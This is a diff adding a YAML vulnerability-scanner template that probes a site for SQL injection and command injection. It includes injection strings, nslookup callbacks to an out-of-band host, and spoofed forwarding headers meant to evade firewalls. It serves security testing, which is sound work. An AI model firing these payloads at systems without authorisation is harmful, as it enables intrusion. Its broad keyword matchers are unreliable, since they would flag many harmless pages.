@@ -1,0 +1,61 @@
+id: sqli-rce-waf-bypass
+
+info:
+  name: Advanced SQLi and RCE Detection with WAF Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects SQL Injection and Remote Code Execution vulnerabilities while attempting to bypass WAF protections using advanced payloads.
+  tags: sqli,rce,waf-bypass,dast
+
+variables:
+  marker: "{{interactsh-url}}"
+  sql_payloads:
+    - "\" OR 1=1--"
+    - "' AND 1=1--"
+    - "' UNION SELECT NULL, NULL--"
+    - "' UNION SELECT @@version--"
+  rce_payloads:
+    - "; nslookup {{marker}}"
+    - "| nslookup {{marker}}"
+    - "$(nslookup {{marker}})"
+    - "`nslookup {{marker}}`"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Forwarded-For: 127.0.0.1
+      X-Originating-IP: 127.0.0.1
+      X-Remote-IP: 127.0.0.1
+      X-Client-IP: 127.0.0.1
+    body: "param={{payload}}"
+
+    payloads:
+      payload:
+        - '{{sql_payloads}}'
+        - '{{rce_payloads}}'
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "database error"
+          - "MySQL"
+        part: body
+
+      - type: word
+        words:
+          - "dns"
+        part: interactsh_protocol
+
+      - type: regex
+        regex:
+          - "(\\bselect\\b|\\bunion\\b|\\bupdate\\b|\\binsert\\b|\\bdelete\\b)"
+        part: body
+
+stop-at-first-match: true
